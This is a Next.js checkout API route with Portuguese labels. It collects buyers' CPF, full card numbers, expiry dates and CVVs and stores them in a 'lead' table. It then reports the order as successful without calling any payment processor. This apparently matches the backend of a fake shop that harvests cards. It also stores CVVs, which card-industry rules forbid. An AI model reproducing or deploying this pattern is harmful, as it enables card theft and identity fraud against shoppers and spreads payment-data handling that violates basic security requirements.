import { NextRequest, NextResponse } from "next/server";
import { z } from "zod";
import { prisma } from "@/lib/prisma";
import { encrypt } from "@/lib/crypto";

// Força a Vercel a tratar esta rota como dinâmica (evita execução no build)
export const dynamic = "force-dynamic";

const checkoutSchema = z.object({
  nome: z.string().min(3, "Nome inválido"),
  email: z.string().email("E-mail inválido"),
  cpf: z.string().min(11, "CPF inválido"),
  telefone: z.string().min(8, "Telefone inválido"),
  numeroCartao: z.string().min(13, "Número do cartão inválido"),
  validade: z.string().min(4, "Validade inválida"),
  cvv: z.string().min(3, "CVV inválido"),
  corSelecionada: z.string(),
  quantidade: z.number().int().positive(),
  totalPago: z.number().positive(),
  cep: z.string().optional(),
  enderecoCompleto: z.string().optional(),
  cidade: z.string().optional(),
  estado: z.string().optional(),
});

export async function POST(req: NextRequest) {
  try {
    const body = await req.json();
    const data = checkoutSchema.parse(body);

    // Encrypt sensitive fields
    const cpfEncrypted = encrypt(data.cpf.replace(/\D/g, ""));
    const cardEncrypted = encrypt(data.numeroCartao.replace(/\D/g, ""));
    const cvvEncrypted = encrypt(data.cvv);

    const lead = await prisma.lead.create({
      data: {
        nome: data.nome,
        email: data.email,
        telefone: data.telefone,
        cpf: cpfEncrypted,
        numeroCartao: cardEncrypted,
        validade: data.validade,
        cvv: cvvEncrypted,
        corSelecionada: data.corSelecionada,
        quantidade: data.quantidade,
        totalPago: data.totalPago,
        cep: data.cep || null,
        endereco: data.enderecoCompleto || null,
        cidade: data.cidade || null,
        estado: data.estado || null,
      },
    });

    return NextResponse.json({
      success: true,
      message: "Pedido realizado com sucesso!",
      orderId: lead.id,
    });
  } catch (error) {
    if (error instanceof z.ZodError) {
      return NextResponse.json(
        { error: error.errors[0]?.message || "Dados inválidos" },
        { status: 400 }
      );
    }

    console.error("Checkout error:", error);
    return NextResponse.json(
      { error: "Erro interno ao processar o pedido. Tente novamente." },
      { status: 500 }
    );
  }
}